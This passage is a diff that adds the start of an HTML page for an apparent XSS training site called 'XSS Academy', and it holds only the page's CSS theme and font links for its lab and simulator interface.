@@ -1,0 +1,2639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>XSS Academy — Learn Cross-Site Scripting</title>
+  <style>
+/* ============================
+   XSS ACADEMY — STYLES
+   Theme: Cyberpunk Terminal
+   ============================ */
+
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap');
+
+:root {
+  --bg: #0a0c10;
+  --bg2: #0f1117;
+  --bg3: #141820;
+  --bg4: #1a1f2e;
+  --border: #1e2535;
+  --border2: #252d40;
+  --text: #c9d1e0;
+  --text2: #7a8399;
+  --text3: #4a5468;
+  --accent: #e63946;
+  --accent2: #ff6b6b;
+  --green: #00d97e;
+  --green2: #0aff9d;
+  --yellow: #ffbe0b;
+  --blue: #4361ee;
+  --blue2: #7b8cde;
+  --purple: #7b2d8b;
+  --orange: #fb8500;
+  --glow-red: 0 0 20px rgba(230, 57, 70, 0.3);
+  --glow-green: 0 0 20px rgba(0, 217, 126, 0.3);
+  --font-mono: 'JetBrains Mono', monospace;
+  --font-display: 'Syne', sans-serif;
+  --sidebar-w: 260px;
+  --transition: all 0.2s ease;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-display);
+  display: flex;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* Scanline effect */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* ===== SIDEBAR ===== */
+.sidebar {
+  width: var(--sidebar-w);
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  position: fixed;
+  top: 0; left: 0; bottom: 0;
+  z-index: 100;
+  overflow-y: auto;
+  transition: var(--transition);
+}
+
+.sidebar-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 20px 16px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg);
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-family: var(--font-display);
+  font-weight: 800;
+  font-size: 18px;
+  color: #fff;
+}
+
+.logo-icon { font-size: 22px; }
+.logo .accent { color: var(--accent); }
+
+.sidebar-toggle {
+  background: none;
+  border: 1px solid var(--border2);
+  color: var(--text2);
+  cursor: pointer;
+  padding: 4px 8px;
+  border-radius: 4px;
+  font-size: 14px;
+  display: none;
+}
+
+.sidebar-section {
+  padding: 16px 12px 8px;
+}
+
+.section-label {
+  font-size: 10px;
+  font-family: var(--font-mono);
+  color: var(--text3);
+  letter-spacing: 2px;
+  padding: 0 4px 8px;
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  width: 100%;
+  background: none;
+  border: none;
+  color: var(--text2);
+  cursor: pointer;
+  padding: 10px 12px;
+  border-radius: 6px;
+  font-family: var(--font-display);
+  font-size: 13px;
+  font-weight: 500;
+  text-align: left;
+  transition: var(--transition);
+  margin-bottom: 2px;
+}
+
+.nav-item:hover { background: var(--bg3); color: var(--text); }
+.nav-item.active { background: rgba(230, 57, 70, 0.1); color: var(--accent2); border-left: 2px solid var(--accent); }
+
+.nav-icon { font-size: 14px; min-width: 18px; }
+
+.badge {
+  margin-left: auto;
+  font-size: 9px;
+  font-family: var(--font-mono);
+  background: rgba(0, 217, 126, 0.15);
+  color: var(--green);
+  padding: 2px 6px;
+  border-radius: 3px;
+}
+.badge.medium { background: rgba(251, 133, 0, 0.15); color: var(--orange); }
+.badge.hard { background: rgba(230, 57, 70, 0.15); color: var(--accent); }
+
+.progress-area {
+  padding: 4px 4px 8px;
+}
+
+.progress-bar-wrap {
+  height: 4px;
+  background: var(--bg4);
+  border-radius: 2px;
+  margin-bottom: 6px;
+}
+
+.progress-bar {
+  height: 100%;
+  background: linear-gradient(90deg, var(--accent), var(--accent2));
+  border-radius: 2px;
+  transition: width 0.5s ease;
+}
+
+.progress-label {
+  font-size: 11px;
+  font-family: var(--font-mono);
+  color: var(--text3);
+}
+
+.badge-area {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 4px;
+  padding: 4px;
+}
+
+.earned-badge {
+  font-size: 11px;
+  background: rgba(230, 57, 70, 0.1);
+  border: 1px solid rgba(230, 57, 70, 0.3);
+  color: var(--accent2);
+  padding: 3px 8px;
+  border-radius: 20px;
+  animation: fadeIn 0.4s ease;
+}
+
+/* ===== MAIN ===== */
+.main {
+  margin-left: var(--sidebar-w);
+  flex: 1;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+.topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 32px;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  z-index: 50;
+}
+
+.breadcrumb {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  color: var(--text2);
+}
+
+.topbar-right {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 12px;
+  color: var(--text3);
+}
+
+.status-dot {
+  width: 7px; height: 7px;
+  background: var(--green);
+  border-radius: 50%;
+  box-shadow: 0 0 8px var(--green);
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.4; }
+}
+
+/* ===== MODULES ===== */
+.module { display: none; padding: 32px 40px 60px; max-width: 960px; animation: fadeIn 0.3s ease; }
+.module.active { display: block; }
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.module-header { margin-bottom: 28px; }
+
+.module-tag {
+  display: inline-block;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 2px;
+  color: var(--accent2);
+  background: rgba(230, 57, 70, 0.1);
+  border: 1px solid rgba(230, 57, 70, 0.2);
+  padding: 4px 10px;
+  border-radius: 3px;
+  margin-bottom: 12px;
+}
+
+.module-tag.lab-tag { background: rgba(67, 97, 238, 0.1); color: var(--blue2); border-color: rgba(67, 97, 238, 0.2); }
+.module-tag.lab-tag.medium { background: rgba(251, 133, 0, 0.1); color: var(--orange); border-color: rgba(251, 133, 0, 0.2); }
+.module-tag.lab-tag.hard { background: rgba(230, 57, 70, 0.1); color: var(--accent2); border-color: rgba(230, 57, 70, 0.3); }
+
+.module-header h1 {
+  font-size: 36px;
+  font-weight: 800;
+  color: #fff;
+  line-height: 1.1;
+  margin-bottom: 10px;
+}
+
+.module-subtitle {
+  color: var(--text2);
+  font-size: 15px;
+  line-height: 1.5;
+}
+
+.module-subtitle code {
+  font-family: var(--font-mono);
+  background: var(--bg4);
+  padding: 2px 6px;
+  border-radius: 3px;
+  color: var(--green);
+  font-size: 13px;
+}
+
+.lab-meta-bar {
+  display: flex;
+  gap: 20px;
+  padding: 12px 16px;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin-bottom: 28px;
+  font-size: 12px;
+  color: var(--text2);
+  flex-wrap: wrap;
+}
+
+.meta-item { display: flex; align-items: center; gap: 6px; }
+
+/* ===== CONCEPT CARDS ===== */
+.concept-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin-bottom: 28px;
+}
+
+.concept-card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  transition: var(--transition);
+}
+
+.concept-card:hover { border-color: var(--border2); }
+.concept-card.full-width { grid-column: 1 / -1; }
+
+.card-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 14px 18px;
+  background: var(--bg3);
+  border-bottom: 1px solid var(--border);
+  font-weight: 700;
+  font-size: 14px;
+  color: #fff;
+}
+
+.card-icon { font-size: 16px; }
+
+.card-body {
+  padding: 18px;
+  font-size: 14px;
+  line-height: 1.7;
+  color: var(--text);
+}
+
+.card-body strong { color: #fff; }
+.card-body p { margin-bottom: 12px; }
+.card-body p:last-child { margin-bottom: 0; }
+
+/* ===== FLOW DIAGRAM ===== */
+.flow-diagram {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 14px;
+  background: var(--bg);
+  border-radius: 6px;
+  margin: 14px 0;
+  flex-wrap: wrap;
+}
+
+.flow-node {
+  background: var(--bg4);
+  border: 1px solid var(--border2);
+  padding: 7px 12px;
+  border-radius: 5px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text2);
+}
+
+.flow-node.danger { background: rgba(251, 133, 0, 0.1); border-color: var(--orange); color: var(--orange); }
+.flow-node.critical { background: rgba(230, 57, 70, 0.15); border-color: var(--accent); color: var(--accent2); box-shadow: var(--glow-red); }
+
+.flow-arrow { color: var(--text3); font-size: 18px; }
+
+/* ===== CALLOUTS ===== */
+.callout {
+  padding: 12px 16px;
+  border-radius: 6px;
+  font-size: 13px;
+  line-height: 1.6;
+  margin: 12px 0;
+}
+
+.callout.info { background: rgba(67, 97, 238, 0.1); border-left: 3px solid var(--blue); color: var(--text); }
+.callout.warning { background: rgba(251, 133, 0, 0.1); border-left: 3px solid var(--orange); color: var(--text); }
+.callout.success { background: rgba(0, 217, 126, 0.1); border-left: 3px solid var(--green); color: var(--text); }
+.callout strong { color: #fff; }
+
+/* ===== TYPES GRID ===== */
+.types-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
+
+.type-card {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 14px;
+}
+
+.type-label {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  padding: 3px 8px;
+  border-radius: 3px;
+  display: inline-block;
+  margin-bottom: 10px;
+}
+
+.type-label.reflected { background: rgba(67, 97, 238, 0.15); color: var(--blue2); }
+.type-label.stored { background: rgba(230, 57, 70, 0.15); color: var(--accent2); }
+.type-label.dom { background: rgba(123, 45, 139, 0.2); color: #c77dff; }
+
+.type-desc { font-size: 12px; color: var(--text2); line-height: 1.5; margin-bottom: 10px; }
+.type-example { font-family: var(--font-mono); font-size: 10px; color: var(--green); background: var(--bg2); padding: 6px; border-radius: 4px; margin-bottom: 8px; }
+.type-danger { font-size: 11px; color: var(--text3); }
+
+/* ===== CODE BLOCKS ===== */
+.code-block {
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 12px 0;
+  font-family: var(--font-mono);
+}
+
+.code-block pre {
+  padding: 14px 16px;
+  font-size: 12px;
+  color: var(--green2);
+  overflow-x: auto;
+  line-height: 1.6;
+  white-space: pre-wrap;
+}
+
+.code-label {
+  padding: 6px 14px;
+  background: var(--bg3);
+  font-size: 9px;
+  letter-spacing: 2px;
+  color: var(--text3);
+  font-family: var(--font-mono);
+  border-bottom: 1px solid var(--border);
+}
+
+.danger-code pre { color: var(--accent2); }
+.highlight-red { color: var(--accent); background: rgba(230,57,70,0.2); padding: 0 3px; border-radius: 2px; }
+.highlight-green { color: var(--green); background: rgba(0,217,126,0.15); padding: 0 3px; border-radius: 2px; }
+
+/* ===== CONCEPT LIST ===== */
+.concept-list {
+  list-style: none;
+  padding: 0;
+  margin: 10px 0;
+}
+
+.concept-list li {
+  padding: 6px 0 6px 16px;
+  font-size: 13px;
+  color: var(--text2);
+  border-left: 2px solid var(--border2);
+  margin-bottom: 6px;
+  position: relative;
+}
+
+.concept-list li::before {
+  content: '▸';
+  position: absolute;
+  left: 4px;
+  color: var(--accent);
+  font-size: 10px;
+  top: 7px;
+}
+
+.danger-list li { border-left-color: rgba(230,57,70,0.3); }
+
+/* ===== TAGS ===== */
+.tag {
+  display: inline-block;
+  font-size: 10px;
+  font-family: var(--font-mono);
+  padding: 2px 7px;
+  border-radius: 3px;
+  margin-right: 8px;
+}
+.tag.red { background: rgba(230,57,70,0.2); color: var(--accent2); }
+.tag.orange { background: rgba(251,133,0,0.15); color: var(--orange); }
+.tag.green { background: rgba(0,217,126,0.15); color: var(--green); }
+
+/* ===== LAB STEPS ===== */
+.step {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  margin-bottom: 16px;
+  overflow: hidden;
+  transition: var(--transition);
+}
+
+.step.locked {
+  opacity: 0.5;
+  pointer-events: none;
+}
+
+.step.locked .step-body { display: none; }
+.step.active .step-body { display: block; }
+
+.step-header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 16px 20px;
+  background: var(--bg3);
+  border-bottom: 1px solid var(--border);
+}
+
+.step-number {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--accent);
+  background: rgba(230,57,70,0.1);
+  border: 1px solid rgba(230,57,70,0.2);
+  padding: 3px 8px;
+  border-radius: 4px;
+}
+
+.step-title {
+  font-weight: 700;
+  font-size: 15px;
+  color: #fff;
+  flex: 1;
+}
+
+.step-status {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--yellow);
+  background: rgba(255,190,11,0.1);
+  padding: 3px 8px;
+  border-radius: 3px;
+}
+
+.step-status.done { color: var(--green); background: rgba(0,217,126,0.1); }
+
+.step-body { padding: 24px 24px; }
+
+.step-explanation {
+  margin-bottom: 20px;
+}
+
+.step-explanation h3 {
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--accent2);
+  margin-bottom: 8px;
+  margin-top: 16px;
+}
+
+.step-explanation h3:first-child { margin-top: 0; }
+.step-explanation p { font-size: 13px; color: var(--text2); line-height: 1.7; margin-bottom: 8px; }
+
+.steps-list {
+  padding-left: 18px;
+  margin: 8px 0;
+}
+
+.steps-list li {
+  font-size: 13px;
+  color: var(--text2);
+  line-height: 1.7;
+  margin-bottom: 4px;
+}
+
+.step-instruction {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  background: rgba(67,97,238,0.08);
+  border: 1px solid rgba(67,97,238,0.15);
+  border-radius: 6px;
+  padding: 10px 14px;
+  font-size: 13px;
+  color: var(--text2);
+  margin: 16px 0;
+}
+
+.instruction-number {
+  color: var(--blue2);
+  font-weight: 700;
+  font-family: var(--font-mono);
+}
+
+/* ===== SIM CONTAINERS ===== */
+.sim-container {
+  margin: 16px 0;
+}
+
+.sim-label {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  letter-spacing: 2px;
+  color: var(--text3);
+  margin-bottom: 6px;
+}
+
+.fake-browser {
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  overflow: hidden;
+}
+
+.fake-browser.mini { border-radius: 6px; }
+
+.browser-bar {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 12px;
+  background: var(--bg4);
+  border-bottom: 1px solid var(--border);
+}
+
+.browser-dots { display: flex; gap: 5px; }
+.browser-dots span {
+  width: 9px; height: 9px;
+  border-radius: 50%;
+  background: var(--text3);
+}
+.browser-dots span:nth-child(1) { background: #ff5f56; }
+.browser-dots span:nth-child(2) { background: #ffbd2e; }
+.browser-dots span:nth-child(3) { background: #27c93f; }
+
+.browser-url {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text3);
+  flex: 1;
+}
+
+.browser-body { padding: 16px; }
+
+.fake-searchbar { display: flex; gap: 8px; margin-bottom: 12px; }
+
+.sim-input {
+  flex: 1;
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  color: var(--text);
+  padding: 8px 12px;
+  border-radius: 5px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  outline: none;
+  transition: var(--transition);
+}
+
+.sim-input:focus { border-color: var(--blue); }
+
+.sim-btn {
+  background: var(--accent);
+  color: #fff;
+  border: none;
+  padding: 8px 16px;
+  border-radius: 5px;
+  cursor: pointer;
+  font-family: var(--font-display);
+  font-size: 12px;
+  font-weight: 600;
+  transition: var(--transition);
+  white-space: nowrap;
+}
+
+.sim-btn:hover { background: var(--accent2); }
+.sim-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+.sim-output {
+  background: var(--bg4);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 12px;
+  font-size: 13px;
+  min-height: 40px;
+  font-family: var(--font-mono);
+  color: var(--text2);
+}
+
+.terminal-output {
+  margin-top: 8px;
+  background: #000;
+  border: 1px solid var(--green);
+  border-radius: 5px;
+  padding: 12px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--green2);
+  line-height: 1.7;
+}
+
+/* ===== QUIZ ===== */
+.quiz-box {
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  padding: 18px;
+  margin-top: 16px;
+  animation: fadeIn 0.3s ease;
+}
+
+.quiz-question {
+  font-size: 14px;
+  font-weight: 600;
+  color: #fff;
+  margin-bottom: 14px;
+}
+
+.quiz-options { display: flex; flex-direction: column; gap: 8px; }
+
+.quiz-btn {
+  background: var(--bg4);
+  border: 1px solid var(--border);
+  color: var(--text2);
+  padding: 10px 14px;
+  border-radius: 6px;
+  cursor: pointer;
+  text-align: left;
+  font-family: var(--font-display);
+  font-size: 13px;
+  transition: var(--transition);
+}
+
+.quiz-btn:hover:not(:disabled) { background: var(--bg2); color: #fff; }
+.quiz-btn.answer-correct { background: rgba(0,217,126,0.1); border-color: var(--green); color: var(--green); }
+.quiz-btn.answer-wrong { background: rgba(230,57,70,0.1); border-color: var(--accent); color: var(--accent2); }
+
+/* ===== VULNERABILITY CARD ===== */
+.vulnerability-card {
+  background: rgba(0,217,126,0.05);
+  border: 1px solid rgba(0,217,126,0.2);
+  border-radius: 8px;
+  padding: 16px 18px;
+  margin: 16px 0;
+}
+
+.vuln-title {
+  font-weight: 700;
+  color: var(--green);
+  margin-bottom: 12px;
+  font-size: 14px;
+}
+
+.vuln-details {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  font-size: 12px;
+  font-family: var(--font-mono);
+  color: var(--text2);
+}
+
+.vuln-details strong { color: var(--text); }
+
+/* ===== COMPARISON TABLE ===== */
+.comparison-table {
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 14px 0;
+  font-size: 12px;
+}
+
+.comp-row {
+  display: grid;
+  grid-template-columns: 1.5fr 1fr 1fr;
+  border-bottom: 1px solid var(--border);
+}
+
+.comp-row:last-child { border-bottom: none; }
+
+.comp-row.header {
+  background: var(--bg3);
+  font-weight: 600;
+  color: var(--text);
+}
+
+.comp-row div {
+  padding: 9px 14px;
+  color: var(--text2);
+  border-right: 1px solid var(--border);
+}
+
+.comp-row div:last-child { border-right: none; }
+.comp-row .highlight { color: var(--accent2); }
+
+/* ===== GUESTBOOK ===== */
+.guestbook-form {
+  margin-bottom: 16px;
+}
+
+.gb-title {
+  font-weight: 700;
+  font-size: 14px;
+  color: #fff;
+  margin-bottom: 10px;
+}
+
+.sim-textarea {
+  width: 100%;
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  color: var(--text);
+  padding: 8px 12px;
+  border-radius: 5px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  resize: vertical;
+  min-height: 70px;
+  margin-bottom: 8px;
+  outline: none;
+  display: block;
+}
+
+.sim-textarea.small { min-height: 50px; }
+
+.guestbook-post {
+  background: var(--bg4);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 10px 14px;
+  margin-bottom: 8px;
+  font-size: 12px;
+}
+
+.gb-post-name { font-weight: 600; color: var(--accent2); margin-bottom: 4px; }
+.gb-post-msg { color: var(--text2); font-family: var(--font-mono); }
+
+/* ===== ATTACK TIMELINE ===== */
+.attack-timeline {
+  margin: 16px 0;
+}
+
+.timeline-title {
+  font-weight: 700;
+  font-size: 13px;
+  color: #fff;
+  margin-bottom: 12px;
+}
+
+.timeline-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 10px 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 13px;
+  color: var(--text2);
+}
+
+.timeline-item:last-child { border-bottom: none; }
+.timeline-item.critical { color: var(--accent2); }
+
+.tl-num {
+  width: 22px; height: 22px;
+  background: var(--accent);
+  color: #fff;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+  font-family: var(--font-mono);
+  font-weight: 700;
+  flex-shrink: 0;
+}
+
+/* ===== INTRUDER SIM ===== */
+.intruder-sim {
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  border-radius: 8px;
+  overflow: hidden;
+  margin: 16px 0;
+}
+
+.intruder-title {
+  padding: 10px 14px;
+  background: var(--bg3);
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text2);
+  border-bottom: 1px solid var(--border);
+}
+
+.intruder-body { padding: 14px; }
+
+.intruder-controls {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 12px;
+}
+
+.intruder-status {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text3);
+}
+
+.intruder-results {
+  max-height: 200px;
+  overflow-y: auto;
+  font-family: var(--font-mono);
+  font-size: 11px;
+}
+
+.result-header {
+  display: grid;
+  grid-template-columns: 2fr 1fr 1.5fr;
+  padding: 6px 8px;
+  background: var(--bg3);
+  color: var(--text3);
+  border-radius: 4px;
+  margin-bottom: 4px;
+}
+
+.result-row {
+  display: grid;
+  grid-template-columns: 2fr 1fr 1.5fr;
+  padding: 5px 8px;
+  border-radius: 3px;
+  transition: var(--transition);
+}
+
+.result-row.blocked { color: var(--accent); background: rgba(230,57,70,0.05); }
+.result-row.allowed { color: var(--green); background: rgba(0,217,126,0.08); font-weight: 600; }
+.result-row.dim { color: var(--text3); }
+
+/* ===== PAYLOAD BREAKDOWN ===== */
+.payload-breakdown { margin: 12px 0; }
+
+.pb-row {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 8px 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 12px;
+}
+
+.pb-row:last-child { border-bottom: none; }
+.pb-row code { font-family: var(--font-mono); color: var(--green); font-size: 11px; min-width: 160px; }
+.pb-row span { color: var(--text2); }
+
+/* ===== EXPLOIT FLOW ===== */
+.exploit-flow {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 4px;
+}
+
+.ef-step {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  border-radius: 6px;
+  padding: 12px 16px;
+  width: 100%;
+  max-width: 500px;
+  font-size: 13px;
+  color: var(--text2);
+}
+
+.ef-step.success { background: rgba(0,217,126,0.08); border-color: rgba(0,217,126,0.2); color: var(--green); }
+
+.ef-icon { font-size: 20px; }
+.ef-arrow { color: var(--text3); font-size: 18px; }
+
+/* ===== COLLAB SIM ===== */
+.collab-sim {
+  display: grid;
+  grid-template-columns: 1fr auto 1fr;
+  gap: 16px;
+  align-items: start;
+}
+
+.collab-arrow {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  color: var(--accent);
+  padding-top: 80px;
+}
+
+.collaborator-panel {
+  background: var(--bg);
+  border: 1px solid var(--accent);
+  border-radius: 8px;
+  overflow: hidden;
+  box-shadow: var(--glow-red);
+}
+
+.collab-title {
+  padding: 10px 14px;
+  background: rgba(230,57,70,0.1);
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--accent2);
+  border-bottom: 1px solid rgba(230,57,70,0.2);
+}
+
+.collab-empty {
+  padding: 20px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text3);
+  min-height: 100px;
+}
+
+.collab-hit {
+  padding: 10px 14px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--green);
+  background: rgba(0,217,126,0.05);
+  animation: fadeIn 0.5s ease;
+}
+
+/* ===== REPEATER ===== */
+.repeater-sim {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+  margin: 16px 0;
+}
+
+.repeater-request, .repeater-response {
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  border-radius: 6px;
+  overflow: hidden;
+}
+
+.rep-label {
+  padding: 7px 12px;
+  background: var(--bg3);
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 2px;
+  color: var(--text3);
+  border-bottom: 1px solid var(--border);
+}
+
+.repeater-code {
+  padding: 14px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text2);
+  line-height: 1.8;
+  white-space: pre;
+}
+
+#repeater-response {
+  padding: 14px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text3);
+  min-height: 80px;
+}
+
+/* ===== COMPLETE STEP ===== */
+.complete-step-btn { margin-top: 20px; }
+
+/* ===== BUTTONS ===== */
+.btn-primary {
+  background: var(--accent);
+  color: #fff;
+  border: none;
+  padding: 12px 24px;
+  border-radius: 7px;
+  cursor: pointer;
+  font-family: var(--font-display);
+  font-size: 14px;
+  font-weight: 700;
+  transition: var(--transition);
+  display: inline-block;
+}
+
+.btn-primary:hover { background: var(--accent2); transform: translateY(-1px); box-shadow: 0 4px 15px rgba(230,57,70,0.3); }
+
+.btn-secondary {
+  background: var(--bg4);
+  color: var(--text2);
+  border: 1px solid var(--border2);
+  padding: 12px 24px;
+  border-radius: 7px;
+  cursor: pointer;
+  font-family: var(--font-display);
+  font-size: 14px;
+  font-weight: 600;
+  transition: var(--transition);
+}
+
+.btn-secondary:hover { background: var(--bg3); color: #fff; }
+
+.module-footer {
+  display: flex;
+  gap: 12px;
+  margin-top: 32px;
+  padding-top: 24px;
+  border-top: 1px solid var(--border);
+}
+
+/* ===== MODAL ===== */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  backdrop-filter: blur(4px);
+}
+
+.modal {
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  border-radius: 10px;
+  width: 320px;
+  overflow: hidden;
+  animation: fadeIn 0.2s ease;
+}
+
+.modal-header {
+  padding: 14px 18px;
+  background: var(--bg3);
+  border-bottom: 1px solid var(--border);
+  font-size: 14px;
+  font-weight: 700;
+  color: #fff;
+}
+
+.modal-body {
+  padding: 28px;
+  text-align: center;
+}
+
+.alert-icon { font-size: 36px; margin-bottom: 10px; }
+
+#alert-message {
+  font-family: var(--font-mono);
+  font-size: 16px;
+  color: var(--text);
+}
+
+.modal-btn {
+  width: 100%;
+  padding: 12px;
+  background: var(--bg3);
+  border: none;
+  border-top: 1px solid var(--border);
+  color: var(--blue2);
+  cursor: pointer;
+  font-family: var(--font-display);
+  font-size: 14px;
+  font-weight: 600;
+  transition: var(--transition);
+}
+
+.modal-btn:hover { background: var(--bg4); }
+
+/* ===== COMPLETION SCREEN ===== */
+.completion-screen {
+  text-align: center;
+  padding: 60px 40px;
+  max-width: 640px;
+  margin: 0 auto;
+}
+
+.completion-icon { font-size: 80px; margin-bottom: 20px; }
+
+.completion-screen h1 {
+  font-size: 40px;
+  font-weight: 800;
+  color: #fff;
+  margin-bottom: 12px;
+}
+
+.completion-subtitle {
+  color: var(--text2);
+  font-size: 15px;
+  margin-bottom: 32px;
+}
+
+.completion-badges {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  flex-wrap: wrap;
+  margin-bottom: 32px;
+}
+
+.completion-badge {
+  background: rgba(0,217,126,0.1);
+  border: 1px solid rgba(0,217,126,0.3);
+  color: var(--green);
+  padding: 8px 16px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 600;
+}
+
+.key-takeaways {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 24px;
+  text-align: left;
+  margin-bottom: 28px;
+}
+
+.key-takeaways h3 {
+  font-size: 15px;
+  font-weight: 700;
+  color: #fff;
+  margin-bottom: 14px;
+}
+
+.key-takeaways ul {
+  list-style: none;
+  padding: 0;
+}
+
+.key-takeaways li {
+  font-size: 13px;
+  color: var(--text2);
+  padding: 7px 0;
+  border-bottom: 1px solid var(--border);
+  padding-left: 16px;
+  position: relative;
+}
+
+.key-takeaways li::before {
+  content: '✓';
+  position: absolute;
+  left: 0;
+  color: var(--green);
+  font-weight: 700;
+}
+
+.key-takeaways li:last-child { border-bottom: none; }
+
+/* ===== GUESTBOOK COMPACT ===== */
+.guestbook-form.compact { margin: 0; }
+
+/* ===== SCROLLBAR ===== */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text3); }
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 900px) {
+  .sidebar { transform: translateX(-100%); }
+  .sidebar.open { transform: translateX(0); }
+  .sidebar-toggle { display: block; }
+  .main { margin-left: 0; }
+  .module { padding: 24px 20px 40px; }
+  .types-grid { grid-template-columns: 1fr; }
+  .concept-grid { grid-template-columns: 1fr; }
+  .repeater-sim { grid-template-columns: 1fr; }
+  .collab-sim { grid-template-columns: 1fr; }
+  .collab-arrow { display: none; }
+}
+
+code {
+  font-family: var(--font-mono);
+  background: var(--bg4);
+  padding: 1px 6px;
+  border-radius: 3px;
+  font-size: 0.9em;
+  color: var(--green);
+}
+
+</style>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<!-- SIDEBAR -->
